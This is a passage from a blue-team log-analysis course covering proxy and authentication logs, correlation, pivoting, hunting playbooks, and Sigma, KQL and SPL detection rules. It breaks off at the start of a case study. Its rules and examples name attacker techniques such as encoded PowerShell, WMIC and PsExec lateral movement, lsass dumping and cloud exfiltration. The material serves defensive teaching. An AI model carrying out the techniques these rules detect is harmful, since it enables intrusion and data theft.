+* Redirections to credential pages
+3. Data Exfiltration
+* Unusual volume of outbound data to a cloud storage domain (e.g., Dropbox, Mega)
+* Use of anonymizing services (Tor gateways, VPN, proxy websites)
+4. Policy Violations and Shadow IT
+* Users accessing unauthorized categories like proxies, torrents, or social media
+* Downloads of executable or compressed files from unknown sources
+5. Detection of Tunneling
+* Suspicious traffic via HTTP CONNECT method
+* High volume of encrypted outbound traffic from non-browser agents
+Detection Techniques and Queries
+Splunk – Detect outbound to suspicious categories
+index=proxy_logs action=allowed category IN ("Command and Control", "Phishing", "Malware")
+Elastic – Detect rare domains
+url.domain : * AND NOT url.domain : ("microsoft.com", "google.com", "internal.corp")
+Sigma – Suspicious Web Upload (Proxy)
+detection:  selection:    http_method: POST    url|contains: ["/upload", "/post", "/submit"]
+Threat Hunting with Proxy Logs
+Technique 1: Hunt for newly registered domains
+* Enrich logs with domain age (using WHOIS or passive DNS)
+* Alert on requests to domains less than 7 days old
+Technique 2: Detect browser impersonation or non-browser User-Agents
+index=proxy_logs NOT user_agent="Mozilla*"
+Technique 3: Identify Beaconing Behavior
+* Repeated access to the same URL at regular intervals
+* Often seen in C2 activity (e.g., every 10 seconds)
+Technique 4: Monitor Large File Uploads
+* POST or PUT method with size > 10MB
+* MIME types like application/zip, application/octet-stream
+Enrichment Techniques
+* VirusTotal / URLHaus API: Check if a domain or URL is known to be malicious
+* Domain Reputation: Use feeds like Talos, Umbrella, or Abuse.ch
+* Geolocation: Determine destination country of outbound requests
+* MITRE ATT&CK Mapping:
+* T1071.001 – Application Layer Protocol: Web
+* T1041 – Exfiltration Over Command and Control Channel
+* T1567 – Exfiltration Over Web Services
+Best Practices
+* Centralize proxy and web filter logs into your SIEM
+* Tag known good domains and suppress noisy traffic
+* Normalize URLs for better parsing and alerting
+* Monitor changes in outbound traffic trends over time
+* Block known malicious and uncategorized domains by default
+Foundations of Log Analysis for Cyber Defense - 3.5 Authentication and Access Logs
+Introduction
+Authentication and access logs are fundamental for tracking user activity, identifying anomalies, and detecting potential security incidents such as brute-force attacks, credential stuffing, lateral movement, and privilege escalation. These logs serve as the foundation for audit trails, compliance monitoring, and identity-centric threat detection.
+Common log sources include:
+* Windows Security Logs
+* Linux /var/log/auth.log
+* Active Directory Domain Controllers
+* VPN gateways
+* SSO platforms (Okta, Azure AD, Keycloak)
+* Cloud IAM logs (AWS CloudTrail, GCP Audit, Azure Sign-in Logs)
+* Web applications and APIs with authentication endpoints
+Key Fields in Authentication Logs
+Field | Description
+Timestamp | Date and time of the login event
+Username | Account used during authentication
+Source IP | Origin of the login attempt
+Target Host | System or service being accessed
+Authentication Type | Password, MFA, Certificate, Kerberos, NTLM
+Event Outcome | Success, Failure, Lockout
+Event ID / Code | Platform-specific identifiers
+Logon Type | Interactive, Network, RDP, Batch
+Session ID | Correlates related events within a session
+Failure Reason | Invalid credentials, disabled account, etc.
+Windows Event Log Examples
+Event ID 4624 – Successful Logon
+An account was successfully logged on.Subject:   Security ID: S-1-5-18  Account Name: WIN-DC$  Logon ID: 0x3E7Logon Type: 10 (RemoteInteractive)New Logon:  Account Name: jsmith  Logon GUID: {e2f...}Network Information:  Workstation Name: WIN10-PC  Source Network Address: 192.168.1.10
+Event ID 4625 – Failed Logon
+An account failed to log on.Failure Reason: Unknown user name or bad passwordAccount For Which Logon Failed:  Account Name: admin  Workstation Name: WIN10-PCSource Network Address: 203.0.113.55
+Linux SSH Example
+/var/log/auth.log
+Jun 30 21:45:22 ubuntu sshd[1541]: Failed password for invalid user admin from 203.0.113.55 port 49876 ssh2Jun 30 21:45:25 ubuntu sshd[1541]: Accepted password for joao from 10.0.0.15 port 49879 ssh2
+Use Cases for Blue Team
+1. Brute-force Detection
+* Multiple failed login attempts in a short time
+* Incremental attempts using different usernames
+* Unusual login sources or times
+2. Credential Stuffing
+* Failed logins from various IPs targeting a single account
+* Use of automation tools (e.g., Hydra, Metasploit)
+3. Privilege Escalation
+* Logins to sensitive accounts (e.g., Administrator, root)
+* Account logins followed by access to privileged resources
+4. Lateral Movement
+* Successful logins across multiple hosts within a short timeframe
+* Logon Type 3 (network) or Type 10 (RDP) in sequence
+5. Unusual Access Patterns
+* Logins from foreign geolocations or outside business hours
+* MFA challenges triggered and denied
+* Accounts accessing unfamiliar services
+Detection Techniques
+Sigma Rule – Failed Logon from External IP
+detection:  selection:    EventID: 4625    SourceNetworkAddress|ip: ['not in private ranges']  condition: selection
+Splunk – Multiple Failures by Username
+index=wineventlog EventCode=4625| stats count by Account_Name, Source_Network_Address| where count > 10
+Elastic – SSH Success Outside Working Hours
+process.name: "sshd" and message: "*Accepted*"and @timestamp not between "08:00:00" and "18:00:00"
+Advanced Examples
+Use Case: Lateral Movement via RDP
+* Detect Event ID 4624 with Logon Type 10 (RemoteInteractive)
+* Group by username and time
+* Alert if same username logs into 3+ different hosts within 10 minutes
+Use Case: Suspicious Service Account Behavior
+* Service account with interactive logons (Logon Type 2)
+* Unexpected login times or external IPs
+Use Case: Impossible Travel Detection
+* User logs in from Brazil, then 5 minutes later from Europe
+* Requires correlation of Source IP + GeoIP + Timestamp
+Threat Hunting Queries
+Suspicious Admin Logins
+index=wineventlog (EventCode=4624 OR EventCode=4625)| search Account_Name IN ("admin", "administrator", "root")
+Accounts with Multiple Lockouts
+index=wineventlog EventCode=4740| stats count by Account_Name, Source_Network_Address
+MITRE ATT&CK Mapping
+Technique | ID
+Valid Accounts | T1078
+Brute Force | T1110
+Remote Services (e.g. RDP) | T1021.001
+Exploitation for Privilege Escalation | T1068
+Best Practices
+* Centralize authentication logs from all systems and services
+* Enable detailed audit logging (especially for failed logons)
+* Alert on high-risk authentication behaviors
+* Apply context: map logon attempts to user profiles and expected behavior
+* Enrich logs with GeoIP, threat intel, and endpoint correlation
+Foundations of Log Analysis for Cyber Defense - 4.1 Fundamentals of Log Correlation in Threat Hunting
+Introduction
+Log correlation is the process of linking events from multiple sources, across time and systems, to form a cohesive view of what occurred within an environment. In threat hunting, correlation is what transforms isolated data points into actionable insights. It allows Blue Team professionals to identify complex attacks, detect lateral movement, and reconstruct adversary behaviors that evade traditional detection mechanisms.
+Whereas SIEM alerts are often based on static rules, manual and hypothesis-driven correlation is dynamic, contextual, and based on understanding attacker tactics, techniques, and procedures (TTPs).
+Why Correlation Matters in Hunting
+An attacker rarely uses a single action. Consider a compromise involving:
+* Phishing click in a proxy log
+* Malicious payload written to disk (EDR log)
+* New scheduled task created (Windows event)
+* Outbound C2 beacon to an IP (Firewall log)
+* Lateral movement via RDP (Authentication logs)
+Individually, none of these may trigger an alert. But when correlated, they form a clear narrative of compromise.
+Types of Log Correlation
+1. Temporal Correlation
+* Events that occur within a specific timeframe
+Example: A suspicious PowerShell script within 5 minutes after a new service is created.
+2. Identity Correlation
+* Events linked by user, host, or session
+Example: User jsmith logs in via VPN, then accesses five critical servers using RDP.
+3. Network Correlation
+* Based on IP addresses, DNS names, and ports
+Example: Beaconing to an IP that was also queried in DNS logs and later seen in firewall logs.
+4. Process/Parent-Child Correlation
+* Especially in EDRs, linking parent and child processes
+Example: winword.exe spawning powershell.exe followed by network activity.
+5. Threat Intelligence Correlation
+* Matching known IOCs against observed logs
+Example: Outbound connections to a domain listed in a threat intel feed.
+Practical Examples
+Example 1: Credential Dumping and Lateral Movement
+* Logon events show successful access to DC1 from HR-PC.
+* Windows event log shows use of rundll32 shortly after login.
+* EDR detects a memory dump of lsass.exe.
+* Two minutes later, the same user logs in to FINANCE-SVR.
+Correlation: All these events occurred within a 6-minute window, linked by the same user, indicating possible credential theft and lateral movement.
+Example 2: Beaconing to C2
+* DNS logs show repeated queries to xyz-cdn.com.
+* Proxy logs show regular GET requests every 60 seconds to the same domain.
+* Firewall logs show outbound connections to IP 192.0.2.50:443.
+Correlation: Repeated behavior indicates C2 beaconing using DNS and HTTP over TLS, possibly with domain fronting.
+Tools and Techniques
+Tool | Use Case
+SIEM (Splunk, Elastic, Sentinel) | Correlation rules and searches
+Threat Hunting Platforms (Velociraptor, LimaCharlie, Gravwell) | Timeline reconstruction
+Jupyter Notebooks | Custom correlation via pandas, timelines
+EDR XDR Consoles | Process relationships, lateral movement
+Hunting Methodology Example
+Hypothesis: Adversary has persistence on an endpoint and is exfiltrating data via PowerShell.
+Log Sources to Correlate:
+* EDR logs (PowerShell usage, parent process relationships)
+* Authentication logs (initial access, session tracking)
+* Proxy logs (unusual domain access)
+* File creation logs (temp files, encoded payloads)
+Steps:
+* Find unusual PowerShell usage (e.g. Base64 encoded commands)
+* Trace parent process (was it Word, Outlook, WMI?)
+* Check if the same user accessed sensitive systems afterward
+* Look for data transfer in proxy/firewall logs to rare destinations
+Challenges and Solutions
+Challenge: Timestamps differ across logs
+Solution: Normalize time via UTC, ensure NTP is enforced on all endpoints
+Challenge: Incomplete data due to log retention gaps
+Solution: Extend retention for high-value logs and use full-packet capture for enrichment
+Challenge: Volume of data is overwhelming
+Solution: Use hunting queries with filters, aggregations, and visualizations (e.g., frequency maps, time series)
+Real-World Application
+In many red team engagements, lateral movement and data exfiltration go undetected because no single event looks suspicious. However, correlating authentication logs with EDR process trees and DNS/proxy traffic reveals the complete attack chain. Mature Blue Teams rely on this technique to:
+* Reconstruct incidents
+* Confirm alerts or dismiss false positives
+* Discover threats that went unnoticed by automated tools
+Foundations of Log Analysis for Cyber Defense - 4.2 Pivoting Across Log Sources (DNS, Proxy, EDR, Authentication)
+Introduction
+In threat hunting, pivoting means taking one data point (e.g., an IP address, domain, hash, or username) and following its trail across multiple log sources to uncover related events or build a timeline. This is a critical skill when investigating multi-stage attacks, lateral movement, or command and control (C2) activity.
+The ability to pivot effectively depends on:
+* Knowing where to look (log source awareness)
+* Understanding relationships between log types
+* Thinking like an attacker and mapping their steps across systems
+Key Log Sources for Pivoting
+Source | Typical Pivot Elements
+DNS logs | Queried domains, client IPs
+Proxy logs | URLs, domains, methods, user agents
+EDR logs | File hashes, parent-child process chains
+Authentication logs | Usernames, logon types, source IPs
+Firewall logs | Source/destination IPs, ports
+Cloud IAM logs | Actor, action, resource accessed
+Example 1: Suspicious Domain in DNS Logs
+Initial Indicator:
+DNS query for cdn-assets-update[.]com from IP 10.10.5.12
+Pivot:
+* Proxy logs: Look for 10.10.5.12 contacting the domain — confirm GET/POST behavior, User-Agent anomalies.
+* Firewall logs: Check if traffic to resolved IP (e.g., 104.21.11.20) passed outbound.
+* EDR logs: What process initiated the DNS query? Often it’s powershell.exe or cmd.exe.
+* Authentication logs: Who was logged into the system 10.10.5.12 at the time?
+This chain allows you to build attribution, intent, and impact.
+Example 2: Suspicious PowerShell Execution
+Initial Indicator:
+powershell.exe -enc seen in EDR logs from host WIN-07
+Pivot:
+* Process tree: Was the parent winword.exe? Likely phishing.
+* Authentication logs: Which user executed it? Did this user log in elsewhere later?
+* DNS/Proxy logs: Any outbound connections following execution?
+* EDR telemetry: Were any files dropped or new scheduled tasks created?
+Hunting Workflow Diagram
+[Indicator: Suspicious IP]                      |           → Firewall logs (verify comms)                      ↓            Proxy logs (URL/path/User-Agent)                      ↓            DNS logs (who resolved domain)                      ↓     EDR logs (which process made the call)                      ↓   Authentication logs (who was logged in)
+This recursive pivoting is the foundation of real threat hunting investigations.
+Practical Techniques for Pivoting
+1. IP-Based Pivot
+* Start with an IP from firewall/proxy logs
+* Find all user agents and target hosts
+* Go backwards: find DNS resolutions for domain/IP
+2. Hash-Based Pivot (EDR-centric)
+* Start with file hash (e.g., SHA256 from malicious DLL)
+* Check all endpoints where it appeared
+* Pivot to processes that launched it
+3. Username-Based Pivot
+* Trace a user across VPN, RDP, internal access
+* Find privilege escalation or lateral movement
+4. Domain-Based Pivot
+* Resolve domain to IPs (DNS logs)
+* Search proxy logs for POSTs or payload exfiltration
+* Match URL patterns to known malware families (e.g., /upload.php, /gate.php)
+5. Beacon Behavior Pivot
+* Identify regular timed outbound requests in proxy
+* Cross-reference source with EDR to find process origin
+* Correlate with DNS domain history
+Tools and Queries
+Elastic KQL
+dns.question.name : "cdn-assets-update.com" | join kind=inner (  process.name : "powershell.exe" AND host.name : "WIN-07")on host.ip
+Splunk SPL
+index=proxy OR index=firewall| search src_ip="10.10.5.12" OR dest_ip="104.21.11.20"| stats values(uri) by src_ip, user, timestamp
+Sigma Rule Example
+title: Powershell Invoked After DNS Resolution of Suspicious Domaindetection:  dns:    query: "*cdn-assets-update.com"  edr:    process_name: "powershell.exe"  condition: dns and edr within 5m
+Common Pitfalls
+Mistake | Risk
+Pivoting without timestamp context | May correlate unrelated events
+Ignoring NAT or proxy masking | Leads to false attribution of source IPs
+Not using session identifiers | Breaks chain of events in multi-user systems
+Overlooking failed authentications | Misses credential stuffing or probing attempts
+Threat Hunting Example: Lateral Movement Pivot
+* Start with an RDP logon (Windows Event ID 4624, Logon Type 10)
+* Pivot to EDR logs to check what was executed post-login
+* Cross-check with DNS logs to see if outbound domains were contacted
+* Look at authentication logs for the same user logging in to other systems
+* Add GeoIP/contextual enrichment: did this account ever log in from an unusual location?
+Foundations of Log Analysis for Cyber Defense - 4.3 Building Hypothesis-Driven Hunting Playbooks
+Introduction
+Unlike reactive alert triage, threat hunting is proactive and intelligence-driven. It requires formulating hypotheses about potential attacker behavior and validating (or refutando) those hypotheses through log analysis and correlation.
+A hunting playbook is a documented and repeatable process that:
+* Starts from a well-structured hypothesis
+* Defines scope and required log sources
+* Lays out step-by-step procedures
+* Uses specific queries and correlation logic
+* Ends with documentation and feedback for detection engineering
+This approach helps Blue Teams avoid random log searches and instead focus on uncovering adversary behavior patterns that often bypass signature-based detections.
+What Is a Threat Hunting Hypothesis?
+A hypothesis is a statement that assumes a specific attacker behavior or technique might have occurred within your environment.
+Example Hypotheses:
+* “An adversary has established persistence using scheduled tasks.”
+* “There is beaconing behavior occurring over HTTP every 60 seconds.”
+* “An internal user is accessing sensitive data they normally do not touch.”
+Good hypotheses are specific, testable, and adversary-aligned.
+Sources of Hypotheses
+Source | Example
+MITRE ATT&CK | T1053.005 – Scheduled Task/Job: Scheduled Task
+Threat Intelligence | APT29 using custom DNS tunneling
+Detection gaps | No alerts exist for use of LOLBins (e.g. mshta.exe)
+Baseline deviation | Spike in authentication from service accounts
+Purple teaming results | Uncovered behavior not yet covered by rules
+Building the Playbook Step by Step
+1. Define the Hypothesis
+Adversaries may have achieved persistence using schtasks.exe on endpoints with recent VPN logins.
+2. Set Objectives
+* Identify machines where scheduled tasks were created manually
+* Link actions to user activity
+* Detect execution of those tasks
+* Identify any payloads or outbound connections tied to them
+3. Identify Log Sources
+Source | Required Data
+Windows Event Logs | Task creation (Event ID 4698), process execution
+EDR Logs | Parent-child process chain (schtasks.exe)
+VPN Logs | Remote access timestamps and users
+Proxy/DNS Logs | Any post-task execution outbound traffic
+4. Create Search Queries
+Splunk
+index=windows EventCode=4698 CommandLine="*schtasks*" | stats count by host, user, CommandLine, _time
+Elastic KQL
+event.action : "scheduled-task-created" AND process.name : "schtasks.exe"
+Pivot to VPN
+index=vpn user=$user$ earliest=-15m latest=+15m
+5. Define Timeline & Correlation Rules
+* VPN login from remote IP
+* Within 15 minutes: creation of scheduled task
+* Within 5 minutes: execution of unknown binary
+6. Document and Automate
+* Capture process trees, hashes, command lines
+* Add to hunting reports and detection backlog
+* Create a new Sigma rule if the behavior is confirmed
+Practical Example: Hypothesis for Data Exfiltration
+Hypothesis: "A compromised host is exfiltrating data via encoded PowerShell over HTTP."
+Plan:
+* Search proxy logs for large or frequent POSTs to unknown domains
+* Identify user-agents with PowerShell (e.g., Microsoft.PowerShell/5.1)
+* Pivot to EDR logs to confirm use of Invoke-WebRequest or Invoke-Expression
+* Match with scheduled tasks or WMI persistence on same host
+Visual Format of a Hunting Playbook
+# Playbook Name: Beaconing via DNS- **Hypothesis**: Adversaries may be using DNS to exfiltrate data or beacon to C2- **ATT&CK Techniques**: T1048.003 (Exfiltration Over Alternative Protocol), T1071.004 (Application Layer Protocol: DNS)- **Logs Required**: DNS, EDR, Firewall, Proxy- **Queries**:    - DNS requests with high frequency to single domain    - Unusual domain length (e.g. > 50 characters)    - PowerShell processes making outbound connections- **Expected Output**: List of endpoints with potential beaconing activity- **Follow-up Actions**: Isolate host, extract memory, block domain
+Key Benefits of Structured Playbooks
+* Makes hunting scalable across teams
+* Captures institutional knowledge for new analysts
+* Feeds directly into detection engineering
+* Supports compliance and audit readiness
+* Enables metrics tracking (e.g., hunts/week, confirmed findings)
+Pro Tips
+* Focus playbooks around TTPs, not IOCs
+* Incorporate feedback loops from red teams or incident response
+* Leverage baseline deviations as starting points
+* Store playbooks in a version-controlled repository (e.g., Git)
+Foundations of Log Analysis for Cyber Defense - 4.4 Hunting for Lateral Movement and Persistence
+Introduction
+Lateral movement and persistence are key post-exploitation phases in adversary operations. After initial access, attackers aim to move within the network to access valuable assets and establish mechanisms to maintain control, even after reboots or account changes.
+Detecting these actions before impact requires correlating logs from different layers — endpoint, authentication, network, and execution — and understanding what legitimate behavior looks like in order to spot deviations.
+Common Techniques for Lateral Movement
+Technique | MITRE ATT&CK ID | Description
+Remote Desktop Protocol | T1021.001 | RDP access between internal hosts
+Pass-the-Hash / Ticket | T1550.002 / .003 | Reuse of stolen credentials or Kerberos tickets
+Windows Admin Shares | T1021.002 | Using SMB (C$, ADMIN$) to execute remotely
+PsExec | T1569.002 | Executing commands on remote systems via service
+WMI/WMIC | T1047 | Remote code execution via Windows Management
+PowerShell Remoting | T1021.006 | Remote sessions using WinRM
+Common Techniques for Persistence
+Technique | MITRE ATT&CK ID | Description
+Scheduled Task / Cron Job | T1053 | Creates tasks that re-execute payloads
+Registry Run Keys | T1547.001 | Modifies keys to auto-start payloads
+Service Binary Modification | T1543.003 | Changes legitimate service paths
+Startup Folder Injection | T1547.001 | Drops payloads into startup folders
+WMI Event Subscriptions | T1546.003 | Uses WMI to execute code on specific triggers
+Hunting Methodology
+Step 1: Define Known Patterns
+Create a list of behaviors associated with lateral movement and persistence (e.g., execution of wmic.exe, creation of scheduled tasks, use of remote shares).
+Step 2: Identify Key Logs
+Source | What to Look For
+Windows Event Logs | Logon events (4624/4625), service creation (7045), tasks
+Sysmon | Process creations, parent-child anomalies, remote threads
+EDR Logs | Lateral tools, signed binaries used for abuse (LOLBins)
+Firewall | Inbound SMB/RDP traffic, new connections between hosts
+DNS / Proxy | Beaconing from new internal IPs
+Step 3: Correlate Behavior
+* Look for logon events followed by unusual remote execution
+* Detect abnormal parent-child relationships (e.g., explorer.exe spawning wmic.exe)
+* Correlate timestamps and user sessions across systems
+Example 1: Suspicious RDP Followed by Task Creation
+* Event ID 4624 (Logon Type 10) from host HR-WS01 using user svc_hr
+* 2 minutes later: Event ID 4698 (Scheduled Task Created) on FINANCE-SRV01
+* EDR confirms task runs cmd.exe /c powershell -enc ...
+* Proxy logs show outbound C2 connection from FINANCE-SRV01 to unknown IP
+This sequence suggests lateral movement into FINANCE-SRV01 with persistence setup and external communication.
+Example 2: WMIC Lateral Movement
+* EDR logs show:
+Parent: svchost.exe → Child: wmic.exe /node:10.0.4.15 process call create ...
+* Sysmon reveals remote process creation on 10.0.4.15
+* Authentication logs show svc_ops account used outside of its normal asset group
+* Follow-up shows scheduled task created on remote machine
+This could indicate automated lateral spread via WMIC and scheduled tasks.
+Sigma Rule Example: Suspicious Use of WMIC
+title: WMIC Remote Executionlogsource:  category: process_creationdetection:  selection:    Image: 'C:\\Windows\\System32\\wbem\\WMIC.exe'    CommandLine|contains: ' /node:'  condition: selectionfields:  - Image  - CommandLine  - ParentImage
+Hunting Queries
+Elastic KQL – Logon Followed by Task Creation
+event.code : "4624" AND logon_type : "10"| join type=inner [  event.code : "4698"] on host.name, user.name
+Splunk – Parent-Child Process Abnormalities
+index=edr OR index=sysmon| transaction host startswith=(process_name="explorer.exe") endswith=(process_name="wmic.exe")| stats count by host, user, parent_process, child_process
+Pro Tips
+* Focus on cross-host behavior: Lateral movement by nature spans systems
+* Watch for anomalous parent-child process combos (e.g., winword.exe spawning powershell.exe)
+* Use time-bounded correlation to reduce noise and enhance accuracy
+* Combine with baseline deviation: Look for persistence on systems not typically associated with changes
+Practical Hunting Playbook (Example)
+Playbook Title: Detecting Lateral Movement via PsExec
+* Hypothesis: "An attacker is using PsExec to spread laterally."
+* Required Logs: Sysmon, EDR, Windows Event Logs, Firewall
+* Hunting Steps:
+* Search for psexec.exe, psexecsvc.exe, or service creation via Event ID 7045
+* Correlate with logon events to verify account used
+* Look for simultaneous outbound SMB connections
+* Cross-check for payload execution or new scheduled tasks
+* Outcome: Confirmed unauthorized PsExec use from compromised admin workstation
+Foundations of Log Analysis for Cyber Defense - 4.5 Using Sigma, KQL, SPL, and Custom Queries for Detection Engineering
+Introduction
+Detection engineering is a discipline that combines threat intelligence, log analysis, and syntax-based rule creation to proactively identify adversary behaviors in an environment. It bridges the gap between threat hunting and automated detection.
+To build high-quality detections, Blue Team professionals must be fluent in query languages and formats like:
+* Sigma – a YAML-based generic detection rule format, easily converted into platform-specific rules (Elastic, Splunk, Sentinel, etc.)
+* KQL (Kusto Query Language) – used in Microsoft Sentinel and Defender
+* SPL (Search Processing Language) – used in Splunk
+* Custom SQL-like syntax – used in platforms like QRadar, Graylog, and others
+Part 1: Sigma Rules
+Sigma provides a way to write detection logic once and convert it into multiple backend formats using tools like sigmac.
+Structure of a Sigma Rule:
+title: Suspicious PowerShell Executionid: abc123description: Detects encoded PowerShell payloads often used in phishing or malwarestatus: experimentallogsource:  product: windows  category: process_creationdetection:  selection:    Image|endswith: '\powershell.exe'    CommandLine|contains:      - ' -enc '      - ' -EncodedCommand '  condition: selectionlevel: high
+Usage:
+sigmac -t splunk suspicious_powershell.yml
+This outputs a ready-to-use SPL query for Splunk.
+Part 2: KQL (Microsoft Sentinel / Defender)
+KQL is designed to query time-series data. It's commonly used in Sentinel, Microsoft Defender for Endpoint, and Log Analytics.
+Example – Detect PowerShell with base64 payload:
+DeviceProcessEvents| where FileName =~ "powershell.exe"| where ProcessCommandLine has " -enc " or ProcessCommandLine has " -EncodedCommand"| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
+Another example – Lateral movement via RDP:
+SigninLogs| where NetworkLocationDetails has "Remote Desktop"| where Location != "Expected Country"
+Part 3: SPL (Splunk Search Processing Language)
+SPL is used for powerful, time-bound and field-based searches in Splunk.
+Example – Search for scheduled task creation and follow-up execution:
+index=wineventlog EventCode=4698 OR EventCode=4688| eval event_type=case(EventCode==4698,"TaskCreated",EventCode==4688,"ProcessExec")| transaction host startswith=(event_type="TaskCreated") endswith=(event_type="ProcessExec") maxspan=15m| table _time, host, user, CommandLine, parent_process_name, event_type
+Example – Search for unusual parent-child process chains:
+index=edr OR index=sysmon| where parent_process_name="winword.exe" AND process_name="powershell.exe"| stats count by host, CommandLine, _time
+Part 4: Combining Languages with Threat Frameworks
+You can build detection rules based on MITRE ATT&CK TTPs and map them to logs using each of the above languages.
+T1059 – Command and Scripting Interpreter:
+* Sigma: process_creation with suspicious scripting languages
+* KQL: DeviceProcessEvents with PowerShell and encoded commands
+* SPL: index=sysmon with scripting tool command lines
+This allows for multi-platform parity of your detection logic.
+Example Exercise: Detecting PsExec Use
+Sigma Rule Example:
+title: PsExec Remote Executionlogsource:  category: process_creationdetection:  selection:    Image|endswith:      - 'psexec.exe'      - 'psexecsvc.exe'  condition: selectionlevel: high
+Converted to KQL:
+DeviceProcessEvents| where FileName in~ ("psexec.exe", "psexecsvc.exe")| project DeviceName, Timestamp, InitiatingProcessAccountName, FolderPath
+Converted to SPL:
+index=edr OR index=sysmonprocess_name="psexec.exe" OR process_name="psexecsvc.exe"| stats count by host, user, parent_process, CommandLine
+Tips for Effective Detection Engineering
+* Always test queries in a lab or threat simulation environment (e.g., with Atomic Red Team)
+* Start from hypotheses or threat intel, not just generic alerts
+* Tag each rule with MITRE ATT&CK technique IDs and log source types
+* Use fields like parent-child process relationships, network behavior, frequency anomalies
+* Prioritize low-noise, high-fidelity rules and fine-tune over time
+* Use dedicated Git repos to version-control Sigma rules
+Summary
+By mastering Sigma, KQL, SPL and similar query languages, a Blue Team analyst can:
+* Build portable detection rules
+* Correlate multi-source logs
+* Write rules aligned with threat actor TTPs
+* Reduce alert fatigue by making rules context-aware
+* Accelerate incident response with precision
+Foundations of Log Analysis for Cyber Defense - 4.6 Integrating Threat Intelligence into Correlation
+Introduction
+Threat Intelligence (TI) is critical in enhancing log analysis and threat hunting. While logs tell what happened, threat intelligence provides context on why it matters, helping analysts prioritize, correlate, and act faster.
+Integrating TI feeds allows you to enrich logs with known indicators of compromise (IOCs) such as IP addresses, domains, URLs, file hashes, and TTPs. When properly used, TI can amplify detections, guide hypothesis-driven hunts, and reduce dwell time.
+Types of Threat Intelligence
+Type | Description
+Tactical (IOCs) | IPs, hashes, domains, user agents used in recent attacks
+Operational | Details about specific campaigns, malware families, TTPs
+Strategic | High-level trends about threat actors and their goals
+Technical | Indicators extracted from malware samples or network traffic
+For log correlation, Tactical and Operational TI are the most actionable.
+Sources of Threat Intelligence
+* Open Source: Abuse.ch, AlienVault OTX, ThreatFox, MISP, IBM X-Force Exchange
+* Commercial: Recorded Future, Anomali, Intel471, Palo Alto AutoFocus, Flashpoint
+* Internal TI: IOC enrichment from past incidents, malware reverse engineering, honeypots
+* ISACs: Sector-specific collaboration groups
+Common IOCs for Log Matching
+IOC Type | Common Log Sources
+IP addresses | Firewall, Proxy, DNS, EDR, NetFlow
+Domains | Proxy, DNS
+URLs | Web logs, Proxy
+Hashes | EDR, Antivirus, Sysmon
+File Names | EDR, Sysmon, Windows Event Logs
+Integration Techniques
+1. IOC Matching in Real-Time
+Match incoming logs against known IOC feeds using your SIEM (e.g., Sentinel, Splunk, QRadar).
+Example – KQL (Sentinel) IP Matching:
+let bad_ips = externaldata(ip:string) [@"https://yourfeed.io/badips.csv"];DeviceNetworkEvents| where RemoteIP in (bad_ips)
+Example – Splunk ThreatMatch:
+| inputlookup ti_bad_ips.csv| join type=inner RemoteIP [ search index=proxy_logs ]
+2. IOC Enrichment of Existing Alerts
+Add context to alerts with threat intelligence enrichment, like:
+* Risk score from TI provider
+* Malware family or campaign name
+* First seen / last seen timestamp
+* ASN / country of IP
+Example:
+Alert triggered: DNS request to dj292jjx.cloudfront.net
+TI Enrichment: Known C2 domain used by AsyncRAT, active since 2023-11, linked to APT37.
+3. Hunting Using TI-Driven Hypotheses
+Use threat actor reports or TI indicators as the starting point of a proactive hunt.
+Example:
+Threat Report: TA551 phishing campaign using macro docs to drop Ursnif
+Hunt Strategy:
+* Look for Word documents spawning cmd.exe or powershell.exe
+* Search for known file hashes
+* Search for connections to known Ursnif C2 IPs
+Case Study: Enriching Proxy Logs with TI
+* Retrieve top 100 domains accessed in last 24h:
+SELECT domain, COUNT(*) FROM proxy_logsWHERE timestamp > NOW() - INTERVAL 1 DAYGROUP BY domain ORDER BY COUNT DESC
+* Cross-reference with MISP feed:
+SELECT * FROM results rJOIN misp_iocs m ON r.domain = m.domain
+* Identify users accessing malicious sites and pivot to EDR logs
+Tools for Integration
+* MISP: Open-source threat sharing and IOC management
+* Sigma + ThreatMatch: Contextual TI lookups in detection rules
+* SOAR Platforms: Automatically enrich alerts with TI during playbook execution
+* TI Gateways: Palo Alto MineMeld, AlienVault OTX API, OpenCTI
+Practical Queries
+SPL – IOC match against Sysmon logs (hash):
+index=sysmon EventCode=1| lookup malware_hashes hash OUTPUT threat_name| where isnotnull(threat_name)
+KQL – Match known threat domains in DNS logs:
+let threat_domains = dynamic(["maliciousdomain.com", "cnc.host.ru"]);DnsEvents| where QueryName in (threat_domains)
+Best Practices
+* Validate the quality of TI feeds: noisy feeds can create alert fatigue
+* Use scoring or confidence levels to prioritize IOCs
+* Correlate TI hits with user behavior (e.g., lateral movement, privilege escalation)
+* Normalize and tag enriched logs to enable easier pivoting
+* Maintain an internal IOC database from your own incidents and malware analysis
+Summary
+Threat intelligence provides crucial context that enhances the effectiveness of log analysis and detection engineering. By integrating IOCs into correlation strategies, analysts can uncover stealthy attacks, accelerate incident response, and proactively hunt based on known adversary infrastructure.
+Foundations of Log Analysis for Cyber Defense - 4.7 Case Study: Threat Hunt Simulation and Report Generation
+Objective
+This case study guides the analyst through a complete end-to-end threat hunting simulation using real-world logs and adversary behavior. The goal is to perform a structured hunt, identify malicious activity, and write a professional report containing findings, indicators, and recommendations.
+The scenario is based on a post-compromise activity involving initial access via phishing, followed by lateral movement and data exfiltration using cloud services.
+Phase 1 – Scenario Setup
+Background
+* A user in the Sales department reports unusual slowness and pop-ups.
+* The security team suspects the machine may have been compromised.
+* You are provided with logs from:
+* Sysmon (Windows event logging)
+* EDR (CrowdStrike)
+* Proxy logs (Zscaler format)
+* DNS logs
+* Authentication logs (AD)
+Your mission is to:
+* Identify the initial infection vector.
+* Map the attacker behavior using MITRE ATT&CK.
+* Correlate indicators across log sources.
+* Recommend remediation steps.
+Phase 2 – Hypothesis and TTP Mapping
+Hypothesis: A phishing email led to malware execution on a workstation. The malware established persistence, then moved laterally via RDP and exfiltrated data via Dropbox.
+Relevant MITRE Techniques:
+* T1566.001 – Phishing: Spearphishing Attachment
+* T1059 – Command and Scripting Interpreter
+* T1021.001 – Remote Desktop Protocol
+* T1041 – Exfiltration Over Web Service
+Phase 3 – Threat Hunting Process
+1. Identify Initial Execution
+Sysmon Query (SPL or KQL):
+index=sysmon EventCode=1CommandLine="powershell*" OR CommandLine="cmd*"| where CommandLine like "%-EncodedCommand%"| stats count by host, CommandLine, ParentProcessName, _time
+Finding:
+A user opened a document from their desktop. It spawned winword.exe, which then launched PowerShell with an encoded payload.
+2. Detect Persistence
+Sysmon EventCode=13 (Registry Modification):
